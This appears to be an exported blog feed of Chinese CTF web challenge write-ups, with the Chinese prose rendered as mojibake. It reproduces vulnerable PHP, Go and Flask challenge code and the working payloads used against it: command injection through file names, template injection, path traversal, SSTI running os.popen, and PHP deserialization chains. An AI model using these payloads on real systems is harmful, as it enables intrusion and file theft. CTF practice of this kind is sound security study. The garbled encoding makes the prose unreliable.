`username_which_you_do_not_know`= &#x27;$user&#x27; and `password_which_you_do_not_know_too` = &#x27;$pass&#x27;&quot;; echo $sql; $res = sql_query($sql);// var_dump($res);// die(); if ($res-&gt;num_rows) &#123; $data = $res-&gt;fetch_array(); $_SESSION[&#x27;user&#x27;] = $data[username_which_you_do_not_know]; $_SESSION[&#x27;login&#x27;] = 1; $_SESSION[&#x27;isadmin&#x27;] = $data[isadmin_which_you_do_not_know_too_too]; return true; &#125; else &#123; return false; &#125; return;&#125;function updateadmin($level,$user)&#123; $sql = &quot;update `albert_users` set `isadmin_which_you_do_not_know_too_too` = &#x27;$level&#x27; where `username_which_you_do_not_know`=&#x27;$user&#x27; &quot;; echo $sql; $res = sql_query($sql);// var_dump($res);// die();// die($res); if ($res == 1) &#123; return true; &#125; else &#123; return false; &#125; return;&#125;function register($user, $pass)&#123; global $mysqli; $user = Filter($user); $pass = md5($pass); $sql = &quot;insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES (&#x27;$user&#x27;,&#x27;$pass&#x27;,&#x27;0&#x27;)&quot;; $res = sql_query($sql); return $mysqli-&gt;insert_id;&#125;function logout()&#123; session_destroy(); Header(&quot;Location: index.php&quot;);&#125;?&gt; ä¸€å¥—å†›ä½“æ‹³ä¸‹æ¥sqlç›´æ¥è¢«å°æ­»ï¼Œâ€flagâ€,â€manageâ€,â€ffffllllaaaagggâ€,â€infoâ€ä¹Ÿè¿›å…¥äº†é»‘åå•ï¼Œä¸èƒ½ç›´æ¥è¯»å–ï¼Œä½†æˆ‘ä»¬æ³¨æ„åˆ°parse_url()ï¼Œæˆ‘ä»¬ä¹‹å‰ä¹Ÿåˆ©ç”¨äº†è¿™ä¸ªå‡½æ•°è¿›è¡Œbypassï¼Œpayloadï¼š 1//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg è¯»å–åˆ°æºç ï¼š 1234567&lt;?phpif (FLAG_SIG != 1)&#123; die(&quot;you can not visit it directly&quot;);&#125;else &#123; echo &quot;you can find sth in m4aaannngggeee&quot;;&#125;?&gt; ç»§ç»­è¯»å–m4aaannngggeeeï¼š 1234567&lt;?phpif (FLAG_SIG != 1)&#123; die(&quot;you can not visit it directly&quot;);&#125;include &quot;templates/upload.html&quot;;?&gt; è®¿é—®templates/upload.htmlä¸Šä¼ æ–‡ä»¶ï¼Œç»“æœæ€ä¹ˆä¼ éƒ½æ˜¯404ï¼Œä½†æ˜¯é€šè¿‡urlæˆ‘ä»¬å‘ç°å­˜åœ¨upllloadddd.phpï¼Œç»§ç»­è¯»å–ï¼š 1234567891011121314151617181920212223242526&lt;?php$allowtype = array(&quot;gif&quot;,&quot;png&quot;,&quot;jpg&quot;);$size = 10000000;$path = &quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;;$filename = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;];if(is_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]))&#123; if(!move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;],$path.$filename))&#123; die(&quot;error:can not move&quot;); &#125;&#125;else&#123; die(&quot;error:not an upload fileï¼&quot;);&#125;$newfile = $path.$filename;echo &quot;file upload success&lt;br /&gt;&quot;;echo $filename;$picdata = system(&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;.$filename.&quot; | base64 -w 0&quot;);echo &quot;&lt;img src=&#x27;data:image/png;base64,&quot;.$picdata.&quot;&#x27;&gt;&lt;/img&gt;&quot;;if($_FILES[&#x27;file&#x27;][&#x27;error&#x27;]&gt;0)&#123; unlink($newfile); die(&quot;Upload file error: &quot;);&#125;$ext = array_pop(explode(&quot;.&quot;,$_FILES[&#x27;file&#x27;][&#x27;name&#x27;]));if(!in_array($ext,$allowtype))&#123; unlink($newfile);&#125;?&gt; æ ¸å¿ƒä»£ç åœ¨$picdata = system(&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;.$filename.&quot; | base64 -w 0&quot;);ï¼Œæˆ‘ä»¬è¦åˆ©ç”¨è¿™é‡Œè¿›è¡Œrceï¼Œæ‰¾äº†åŠå¤©ä¸Šä¼ ç‚¹ï¼Œæœ€åå‘ç°åœ¨user.php?page=m4aaannngggeeeã€‚ ä¸Šä¼ æ–‡ä»¶ï¼Œæ›´æ”¹æ–‡ä»¶åä¸º;ls;#ï¼ŒæŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œæ²¡å‘ç°flagï¼Œå› æ­¤å»æ ¹ç›®å½•æ‰¾ï¼Œæ–œæ è¢«å±è”½ç”¨cdä»£æ›¿ï¼š 12filename=&quot;;cd ..;ls;#&quot;filename=&quot;;cd ..;cat flag_233333;#&quot; å¾—åˆ°flagã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"NSSCTFç»ƒä¹ 3","slug":"NSSCTFç»ƒä¹ 3","date":"2022-04-08T06:08:30.000Z","updated":"2022-04-09T10:09:45.835Z","comments":true,"path":"2022/04/08/NSSCTFç»ƒä¹ 3/","link":"","permalink":"http://example.com/2022/04/08/NSSCTF%E7%BB%83%E4%B9%A03/","excerpt":"å‰è¨€ç»§ç»­åˆ·NSSCTFä¸Šçš„é¢˜ã€‚","text":"å‰è¨€ç»§ç»­åˆ·NSSCTFä¸Šçš„é¢˜ã€‚ [SCTF 2021]loginmeä¸‹è½½é™„ä»¶ï¼Œå‘ç°æ˜¯goè¯­è¨€ç¼–å†™çš„ç½‘é¡µï¼Œè™½ç„¶æ²¡å­¦è¿‡goï¼Œä½†æ˜¯å…³é”®ä»£ç éƒ¨åˆ†è¿˜æ˜¯èƒ½å®¡çš„ã€‚ åŒæ—¶è¿›å…¥ç½‘é¡µï¼Œæç¤ºæˆ‘ä»¬éæœ¬åœ°ä¸èƒ½ç™»å½•ï¼Œä½†æ˜¯æµ‹è¯•å‘ç°ä¸èƒ½ç”¨xffç»•è¿‡ï¼Œå› æ­¤æˆ‘ä»¬æ‰¾åˆ°å¯¹åº”ä»£ç middleware.goï¼š 1234567891011121314151617181920package middlewareimport ( &quot;github.com/gin-gonic/gin&quot;)func LocalRequired() gin.HandlerFunc &#123; return func(c *gin.Context) &#123; if c.GetHeader(&quot;x-forwarded-for&quot;) != &quot;&quot; || c.GetHeader(&quot;x-client-ip&quot;) != &quot;&quot; &#123; c.AbortWithStatus(403) return &#125; ip := c.ClientIP() if ip == &quot;127.0.0.1&quot; &#123; c.Next() &#125; else &#123; c.AbortWithStatus(401) &#125; &#125;&#125; æ˜¾ç„¶xffå’Œcipéƒ½è¢«ç¦ç”¨äº†ï¼Œä½¿ç”¨å°±ä¼šè·³è½¬è‡³403é¡µé¢ï¼Œå› æ­¤è¿™é‡Œè¦ä½¿ç”¨x-real-ipç»•è¿‡ã€‚ æ¥ç€æˆ‘ä»¬å‘ç°ä¹‹åçš„é¡µé¢å›æ˜¾äº†ä¸€äº›ä¿¡æ¯ï¼Œæ ¹æ®urlä¸­idå€¼çš„ä¸åŒå›æ˜¾å†…å®¹ä¹Ÿä¸åŒï¼Œé‚£ä¹ˆæˆ‘ä»¬å®¡æŸ¥ä¸‹è¿™ä¸€éƒ¨åˆ†çš„ä»£ç ï¼Œstructs.goï¼š 123456789101112131415161718192021222324252627282930313233343536package structstype UserInfo struct &#123; Id int Username string Age string Password string&#125;var Users = []UserInfo&#123; &#123; Id: 1, Username: &quot;Grandpa Lu&quot;, Age: &quot;22&quot;, Password: &quot;hack you!&quot;, &#125;, &#123; Id: 2, Username: &quot;Longlone&quot;, Age: &quot;??&quot;, Password: &quot;i don&#x27;t know&quot;, &#125;, &#123; Id: 3, Username: &quot;Teacher Ma&quot;, Age: &quot;20&quot;, Password: &quot;guess&quot;, &#125;,&#125;var Admin = UserInfo&#123; Id: 0, Username: &quot;Admin&quot;, Age: &quot;&quot;, Password: &quot;flag&#123;&#125;&quot;,&#125; æˆ‘ä»¬å‘ç°adminçš„å¯†ç å°±æ˜¯flagï¼Œè€Œageæ˜¯ç©ºçš„ï¼Œä½†æ˜¯åœ¨è¿”å›æ—¶æˆ‘ä»¬å‘ç°adminçš„ageæœ‰è¿”å›ï¼Œå› æ­¤æˆ‘ä»¬è·Ÿè¿›ageçš„è¿”å›ï¼ŒæŸ¥çœ‹ä»£ç route.phpï¼š 12345678age := TargetUser.Ageif age == &quot;&quot; &#123; age, flag = c.GetQuery(&quot;age&quot;) if !flag &#123; age = &quot;forever 18 (Tell me the age)&quot; &#125;&#125;html := fmt.Sprintf(templates.AdminIndexTemplateHtml, age) ç”±äºå¹´é¾„æ˜¯ç©ºæ‰€ä»¥è¿”å›äº†å¯¹åº”çš„å€¼ï¼Œè€Œæ‰“å°å¹´é¾„çš„ä»£ç æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²å¹¶èµ‹å€¼ç»™æ–°ä¸²ã€‚ç»§ç»­å¾€ä¸‹çœ‹å‘ç°è¿˜æœ‰æ¨¡æ¿æ¸²æŸ“è¯­å¥ï¼š 1tmpl, err := template.New(&quot;admin_index&quot;).Parse(html) goè¯­è¨€æ¨¡æ¿æ¸²æŸ“æ”¯æŒä¼ å…¥ä¸€ä¸ªç»“æ„ä½“çš„å®ä¾‹æ¥æ¸²æŸ“å®ƒçš„å­—æ®µï¼Œå°±æœ‰å¯èƒ½é€ æˆä¿¡æ¯æ³„éœ²ã€‚è€Œåœ¨goè¯­è¨€ä¸­ä½¿ç”¨çš„æ˜¯&#123;&#123;.name&#125;&#125;ä»£è¡¨è¦åº”ç”¨çš„å¯¹è±¡ï¼Œæ‰€ä»¥å¯ä»¥è®©age=&#123;&#123;.Password&#125;&#125;ã€‚ payloadï¼š 12?id=0&amp;age=&#123;&#123;.Password&#125;&#125;X-Real-IP: 127.0.0.1 [GKCTF 2021]easycmsä¹Ÿå¼€å§‹åšä¸€äº›cmsçš„é¢˜ç›®äº†ã€‚é¦–å…ˆç›®å½•æ‰«ææ‰«å‡ºadmin.phpï¼Œè¿›å…¥ç™»å½•ï¼Œæç¤º5ä½å¼±å£ä»¤ï¼Œæµ‹è¯•å‡ºæ¥æ˜¯12345ã€‚è¿›å…¥åå°åï¼Œå¯»æ‰¾èƒ½å¤Ÿåˆ©ç”¨çš„åˆ©ç”¨ç‚¹ï¼Œæ¯”å¦‚æ–‡ä»¶ä¸Šä¼ ã€é¡µé¢æ›´æ”¹ç­‰ç­‰ã€‚ æˆ‘ä»¬åœ¨è®¾è®¡-ä¸»é¢˜çš„èœå•ä¸­å‘ç°å¯ä»¥æ›´æ”¹ç½‘é¡µè®¾ç½®ï¼Œå¹¶ä¸”åœ¨ç±»å‹é€‰æ‹©ä¸­å¯ä»¥é€‰æ‹©phpæºä»£ç ï¼Œå› æ­¤æˆ‘ä»¬åœ¨é¦–é¡µç¼–è¾‘çš„å¹»ç¯ç‰‡ä¸­æ›´æ”¹å†…å®¹ä¸ºphpæºä»£ç ã€‚ä½†æ˜¯ä¿å­˜æ—¶å‘ç°éªŒè¯ç®¡ç†å‘˜æƒé™ï¼š 1è¯·åœ¨æœåŠ¡å™¨åˆ›å»º /var/www/html/system/tmp/vhpg.txt æ–‡ä»¶ï¼Œå¦‚æœå­˜åœ¨è¯¥æ–‡ä»¶ï¼Œä½¿ç”¨ç¼–è¾‘è½¯ä»¶æ‰“å¼€ï¼Œé‡æ–°ä¿å­˜ä¸€éã€‚ é‚£ä¹ˆæˆ‘ä»¬éœ€è¦å¯»æ‰¾æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œæˆ‘ä»¬åœ¨è®¾è®¡-ç»„ä»¶-ç´ æåº“ä¸­å‘ç°ä¸Šä¼ ç‚¹ï¼Œä¸Šä¼ ä¸€ä¸ªtxtåæ ¹æ®ç›®å½•æ¥é‡å‘½åæ–‡ä»¶ï¼š 1../../../../../system/tmp/vhpg è·¯å¾„ç¡®è®¤æ›´æ”¹åï¼Œå›åˆ°ä¹‹å‰çš„é¡µé¢æ›´æ”¹å¸ƒå±€ä¸ºphpæºä»£ç ï¼Œç›´æ¥rceï¼Œå›åˆ°å‰å°ï¼ŒåŸæ¥å¹»ç¯ç‰‡çš„ä½ç½®å·²ç»å˜æˆäº†flagã€‚ [HCTF 2018]Warmupè¿›å…¥ç½‘é¡µçœ‹åˆ°ä¸€ä¸ªæ»‘ç¨½ï¼Œå®¡æŸ¥å…ƒç´ å‘ç°æç¤ºsource.phpã€‚ å®¡è®¡ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849 &lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; ä¸€çœ¼çœ‹è¿‡å»ä»¥ä¸ºæ˜¯ååºåˆ—åŒ–ï¼Œä½†æ˜¯æœ‰æ²¡çœ‹åˆ°ååºåˆ—åŒ–çš„å‡½æ•°ã€‚å› æ­¤é¦–å…ˆçœ‹classå¤–çš„éƒ¨åˆ†ï¼Œä¸€ä¸ªæ–‡ä»¶åŒ…å«ï¼Œæœ€é‡è¦çš„æ˜¯æœ‰åšè°ƒç”¨ã€‚é‚£ä¹ˆæˆ‘ä»¬é¡ºåŠ¿åº·åº·classå†…éƒ¨ã€‚ æˆ‘ä»¬å‘ç°ç™½åå•åªå…è®¸è¯»å–source.phpå’Œhint.phpï¼Œä¼ å…¥hint.phpè¯»å–ï¼š 1flag not here, and flag in ffffllllaaaagggg å¥½ï¼Œæˆ‘ä»¬çŸ¥é“äº†flagè—åœ¨å“ªé‡Œäº†ï¼Œä½†æ˜¯æˆ‘ä»¬æ²¡æ³•ç›´æ¥è¯»å–ï¼Œå› æ­¤ç»§ç»­å¾€ä¸‹çœ‹ï¼š 1234$_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) æˆ‘ä»¬å¯ä»¥å¥½å¥½ç ”ç©¶ä¸‹è¿™æ®µä»£ç ï¼Œmb_strpos()çš„ä½œç”¨æ˜¯è¿”å›ç¬¬äºŒä¸ªå‚æ•°åœ¨ç¬¬ä¸€ä¸ªå‚æ•°ä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå› æ­¤æ­£å¸¸æƒ…å†µä¸‹è¿™é‡Œè¿”å›çš„åº”è¯¥æ˜¯æœ€åä¸€ä¸ªä½ç½®ï¼Œå³-1ã€‚ æ¥ä¸‹æ¥æ˜¯mb_strpos()ï¼Œè¿™ä¸ªå‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ“ä½œå­—ç¬¦ä¸²ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æ“ä½œèµ·å§‹ä½ç½®ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯æ“ä½œå­—ç¬¦é•¿åº¦ã€‚å› æ­¤è¿™é‡Œæœ¬åº”è¯¥è¯»å–$pageçš„å…¨éƒ¨å†…å®¹ï¼Œå³fileçš„å†…å®¹ã€‚ ä½†æ˜¯å¦‚æœæˆ‘ä»¬åœ¨fileä¸­åŠ å…¥?ï¼Œé‚£ä¹ˆå°±èƒ½é€ æˆæˆªæ–­ã€‚è¿™ä¸ªæ—¶å€™pageå°†ä¼šéªŒè¯?å‰æ–¹çš„stræ˜¯å¦åŒ…å«åœ¨arrayä¸­ï¼Œå› æ­¤å°±èƒ½å®ç°checkFileå‡½æ•°çš„ç»•è¿‡ã€‚ æˆ‘ä»¬å‘ç°åŸå‡½æ•°è¿›è¡Œäº†ä¸€æ¬¡urlè§£ç ï¼Œå› æ­¤æˆ‘ä»¬è¿›è¡Œä¸¤æ¬¡urlç¼–ç ï¼Œè¿™æ ·å¾—åˆ°çš„%253fä¼šåœ¨ç¬¬äºŒæ¬¡decodeåäºæœ€åä¸€ä¸ªin_arrayéªŒè¯è¢«æˆªæ–­å¹¶è¿”å›trueã€‚æœ€ååˆ©ç”¨/è¯»å–flagï¼Œpayloadï¼š 1?file=hint.php%253f/../../../../ffffllllaaaagggg [NCTF 2018]å…¨çƒæœ€å¤§äº¤å‹ç½‘ç«™è¿™é¢˜æ˜¯ä¸ªæ¯”è¾ƒç‰¹æ®Šçš„gitæºç æ³„éœ²ï¼Œè·Ÿä¹‹å‰çš„æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œæ„Ÿè§‰æŒºæœ‰æ„æ€çš„å°±è®°å½•ä¸€ä¸‹ã€‚ é¦–å…ˆæ˜¯NSSç¯å¢ƒçš„é—®é¢˜å¯¼è‡´é¢˜ç›®æœ‰ç‚¹é—®é¢˜ï¼Œè®¿é—®/.gitæ—¶ä¸ä¼šè·³403è€Œæ˜¯ç›´æ¥åˆ°ç›®å½•äº†ï¼Œä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œå› ä¸ºè¿™æ ·æˆ‘ä»¬ä¹Ÿæ²¡æ³•è·å–flagã€‚ æˆ‘ä»¬å¸¸ç”¨çš„GitHackå·¥å…·ä¼šç›´æ¥æŠŠ.gitæ¢å¤åˆ°æ–‡ä»¶å·²ç»å®Œæˆäº†ï¼Œç„¶åè¿˜æŠŠ.gitæ–‡ä»¶å¤¹åˆ äº†ï¼Œä¹Ÿå°±è‡ªåŠ¨æ¢å¤æˆäº†æœ€æ–°ç‰ˆæœ¬ã€‚å› æ­¤æˆ‘ä»¬è¦ä½¿ç”¨lijiejieçš„GitHackå·¥å…·ã€‚ è¿™é¢˜çš„æ€è·¯å’Œpç‰›15å¹´çš„ä¸€ç¯‡æ–‡ç« å…¶ä¸­çš„ä¸€äº›å†…å®¹æ˜¯ä¸€æ ·çš„ï¼Œå…ˆè´´ä¸€ä¸‹ï¼šXDCTF2015ä»£ç å®¡è®¡å…¨è§£ 1python GitHack.py http://1.14.71.254:28583/.git/ ä¸‹è½½åå‘ç°README.mdï¼š 1Allsource files areingit tag1.0 è¯´æ˜flagåœ¨å†å²ç‰ˆæœ¬ä¸­ï¼Œç”±äºåŸç†æ³•å®åœ¨éš¾å•ƒï¼Œæˆ‘ä»¬å°±ç›´æ¥ç”¨å·¥å…·å•ƒï¼Œç›´æ¥ä¸Šscarbbleï¼š 1./scrabble http://1.14.71.254:28583 é€šè¿‡git logæŸ¥çœ‹å†å²ï¼š æŠŠheadè½®æµæŒ‡å‘è¿™äº›æ–‡ä»¶ï¼Œæ‰¾åˆ°çœŸæ­£çš„flagè—åœ¨helloä¸­ï¼š 1git show HEAD 01b878ee5f39810a02f06b4a560571413020ea42 [CISCN 2019åä¸œå—]Double Secretè¿›å…¥ç½‘é¡µï¼Œå•¥éƒ½æ²¡æœ‰ï¼Œåªæœ‰ä¸€è¡Œæç¤ºï¼š 1Welcome To Find Secret è¿™ä¸ªæ„æ€æ¯”è¾ƒæŠ½è±¡ï¼Œå…¶å®æ˜¯æŒ‡å‘secretè·¯ç”±ï¼Œè¿›å…¥ååˆæœ‰ä¸€è¡Œæç¤ºï¼š 1Tell me your secret.I will encrypt it so others can&#x27;t see è¿™æ¯”ä¸Šä¸€ä¸ªæ¥è¯´è¿˜æ˜¯å¥½ä¸€ç‚¹çš„ï¼Œæ„æ€å°±æ˜¯ä¼ å‚ä¸€ä¸ªsecretï¼Œé‚£ä¹ˆæˆ‘ä»¬åº”è¯¥ä¼ å‚å•¥ï¼Œæ— éå°±è¯•è¯•sqlã€sstiè¿™å‡ ä¸ªæ¯”è¾ƒå¸¸ç”¨çš„ã€‚ ç»æµ‹è¯•æ˜¯sstiï¼Œæˆ‘ä»¬è¾“å…¥&#123;&#123;2+2&#125;&#125;æ—¶å‡ºç°äº†æŠ¥é”™ï¼Œå‘Šè¯‰æˆ‘ä»¬æ¨¡æ¿æ˜¯flaskï¼Œpython2.7ï¼Œä½¿ç”¨RC4åŠ å¯†ç®—æ³•ï¼Œå¯†é’¥ä¸ºHereIsTreasureã€‚ å› æ­¤æˆ‘ä»¬ä½¿ç”¨rc4åŠ å¯†çš„expå¯¹payloadè¿›è¡ŒåŠ å¯†ï¼š 12345678910111213141516171819202122232425262728293031import base64from urllib.parse import quotedef rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;): # print(&quot;RC4åŠ å¯†ä¸»å‡½æ•°&quot;) s_box = rc4_init_sbox(key) crypt = str(rc4_excrypt(message, s_box)) return cryptdef rc4_init_sbox(key): s_box = list(range(256)) # print(&quot;åŸæ¥çš„ s ç›’ï¼š%s&quot; % s_box) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] # print(&quot;æ··ä¹±åçš„ s ç›’ï¼š%s&quot;% s_box) return s_boxdef rc4_excrypt(plain, box): # print(&quot;è°ƒç”¨åŠ å¯†ç¨‹åºæˆåŠŸã€‚&quot;) res = [] i = j = 0 for s in plain: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(ord(s) ^ k)) cipher = &quot;&quot;.join(res) print(&quot;%s&quot; %quote(cipher)) return (str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))rc4_main(&quot;HereIsTreasure&quot;,&quot;&#123;&#123;lipsum.__globals__.__builtins__.eval(\\&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag.txt&#x27;).read()\\&quot;)&#125;&#125;&quot;) payload: 1/secret?secret=.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92 ä¼ å‚è·å–flagã€‚ [AFCTF 2021]searchè¿™é¢˜è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œé¦–å…ˆä¿¡æ¯æœé›†å‘ç°www.zipï¼Œè·å–æºç search.phpï¼š 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);$argv = $_GET[&quot;search&quot;];for ($i = 0; $i &lt; strlen($argv); $i++) &#123; if (($argv[$i] == &#x27;&amp;&#x27;) || ($argv[$i] == &#x27;&gt;&#x27;) || ($argv[$i] == &#x27;&lt;&#x27;) || ($argv[$i] == &#x27;(&#x27;) || ($argv[$i] == &#x27;;&#x27;) || ($argv[$i] == &#x27;|&#x27;) ) &#123; if ($i == 0) &#123; goto error; &#125; if (($i == 1) &amp;&amp; ($argv[0] == &#x27;\\\\&#x27;)) &#123; continue; &#125; if (($argv[$i - 1] == &#x27;\\\\&#x27;) &amp;&amp; ($argv[$i - 2] != &#x27;\\\\&#x27;)) &#123; continue; &#125; error: exit(&quot;Input contains prohibited characters!&lt;br&gt;&quot;); &#125;&#125;echo &quot;&lt;h3&gt;Search reslut:&lt;/h3&gt;&lt;br&gt;&quot;;system(&quot;find / -iname &quot; . $argv);?&gt; éå¸¸ç›´è§‚ï¼Œå®è¡Œfindå‘½ä»¤ï¼Œå‘ç°flagåœ¨æ ¹ç›®å½•ä¸‹ï¼Œè¿™é‡Œæˆ‘ä»¬åªéœ€è¦åˆ©ç”¨-execæ‰§è¡Œå‘½ä»¤å°±å¯ä»¥äº†ï¼Œpayload: 1/search.php?search=flag -exec cat &#123;&#125; \\;","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-write up -ctf -web","slug":"write-up-ctf-web","permalink":"http://example.com/tags/write-up-ctf-web/"}]},{"title":"popé“¾ä¸“ç»ƒ1","slug":"popé“¾ä¸“ç»ƒ1","date":"2022-04-07T05:47:08.000Z","updated":"2022-04-07T12:48:28.351Z","comments":true,"path":"2022/04/07/popé“¾ä¸“ç»ƒ1/","link":"","permalink":"http://example.com/2022/04/07/pop%E9%93%BE%E4%B8%93%E7%BB%831/","excerpt":"å‰è¨€è¯´æ¶è¡¥popå°±è¦æ¶è¡¥popï¼ŒåŸºç¡€çŸ¥è¯†å·²ç»åŸºæœ¬å…¨éƒ¨è¿‡äº†ä¸€éäº†ï¼Œæ¥ä¸‹æ¥ä¸»è¦å°±æ˜¯ç»ƒé¢˜äº†ã€‚","text":"å‰è¨€è¯´æ¶è¡¥popå°±è¦æ¶è¡¥popï¼ŒåŸºç¡€çŸ¥è¯†å·²ç»åŸºæœ¬å…¨éƒ¨è¿‡äº†ä¸€éäº†ï¼Œæ¥ä¸‹æ¥ä¸»è¦å°±æ˜¯ç»ƒé¢˜äº†ã€‚ [SWPUCTF 2021 æ–°ç”Ÿèµ›]popå…¥é—¨popé¢˜ï¼ŒæŸ¥çœ‹æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142 &lt;?phperror_reporting(0);show_source(&quot;index.php&quot;);class w44m&#123; private $admin = &#x27;aaa&#x27;; protected $passwd = &#x27;123456&#x27;; public function Getflag()&#123; if($this-&gt;admin === &#x27;w44m&#x27; &amp;&amp; $this-&gt;passwd ===&#x27;08067&#x27;)&#123; include(&#x27;flag.php&#x27;); echo $flag; &#125;else&#123; echo $this-&gt;admin; echo $this-&gt;passwd; echo &#x27;nono&#x27;; &#125; &#125;&#125;class w22m&#123; public $w00m; public function __destruct()&#123; echo $this-&gt;w00m; &#125;&#125;class w33m&#123; public $w00m; public $w22m; public function __toString()&#123; $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;(); return 0; &#125;&#125;$w00m = $_GET[&#x27;w00m&#x27;];unserialize($w00m);?&gt; é“¾å­çš„æ„å»ºè¿˜æ˜¯å¾ˆæ˜æ˜¾çš„ï¼Œä¸»è¦æ˜¯å‡ºå…¥å£éƒ½å¤ªæ˜ç¡®äº†ï¼Œç›´æ¥æ„é€ expï¼š 123456789101112131415161718192021222324252627282930&lt;?phperror_reporting(0);show_source(&quot;index.php&quot;);class w44m&#123; private $admin = &#x27;w44m&#x27;; protected $passwd = &#x27;08067&#x27;;&#125;class w22m&#123; public $w00m; public function __construct()&#123; $this-&gt;w00m=new w33m(); &#125;&#125;class w33m&#123; public $w00m; public $w22m = &quot;Getflag&quot;; public function __construct()&#123; $this-&gt;w00m=new w44m(); return 0; &#125;&#125;$a=new w22m();echo urlencode(serialize($a));?&gt; [CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropboxè´¨é‡å¾ˆé«˜çš„ä¸€é¢˜ï¼ŒåŒæ—¶ç»“åˆäº†pharååºåˆ—åŒ–çš„è€ƒç‚¹ã€‚é¦–å…ˆè¿›å…¥ç½‘é¡µï¼Œå‘ç°è¦ç™»å½•ï¼Œé‚£ä¹ˆæ³¨å†Œç™»å½•ã€‚ ç™»é™†åå‘ç°å­˜åœ¨æ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯å‘ç°å¯¹åç¼€è¿›è¡Œç™½åå•ï¼Œå› æ­¤uploadæ¼æ´è¢«å µäº†ï¼Œæ¥ç€å‘ç°ä¸Šä¼ åå¯ä»¥è¿›è¡Œæ–‡ä»¶ä¸‹è½½ï¼Œå¹¶ä¸”å¯¹filenameæ²¡æœ‰è¿›è¡Œé™åˆ¶åŠç¼–ç ï¼ŒçŒœæµ‹å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½ã€ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¼€å§‹ä¸‹è½½æ–‡ä»¶ï¼š index.php 1234567891011121314151617&lt;?phpsession_start();if (!isset($_SESSION[&#x27;login&#x27;])) &#123; header(&quot;Location: login.php&quot;); die();&#125;?&gt;HTMLçœç•¥&lt;?phpinclude &quot;class.php&quot;;$a = new FileList($_SESSION[&#x27;sandbox&#x27;]);$a-&gt;Name();$a-&gt;Size();?&gt; class.phpï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144&lt;?phperror_reporting(0);$dbaddr = &quot;127.0.0.1&quot;;$dbuser = &quot;root&quot;;$dbpass = &quot;root&quot;;$dbname = &quot;dropbox&quot;;$db = new mysqli($dbaddr, 